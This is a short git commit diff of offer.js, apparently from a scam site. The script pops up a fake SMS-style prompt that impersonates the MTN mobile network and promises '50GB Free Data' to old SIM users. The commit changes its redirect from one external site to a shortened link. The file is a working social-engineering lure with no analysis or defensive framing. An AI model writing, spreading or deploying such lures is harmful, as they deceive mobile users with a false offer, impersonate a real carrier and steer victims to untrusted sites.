b959dd77593b65ac789915611b1d0195e518d93f
uptomars <Kenoly555+me@gmail.com>
2026-05-26 09:22:41 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -2,7 +2,7 @@
 var password = '50GB DATA'
 password=prompt('SMS: Congratulations You are Eligible to receive 50GB Free Data MTN OLD SIM USER REWARD Valid For 30days, Kindly Press OK to ACTIVATE ','50GB DATA');
 if (password != '50GB DATA') {
-location.href='https://data247active.com/50GB';
+location.href='https://sutlnk.ink/MTN-50GB-Free-Data';
 }
 
 
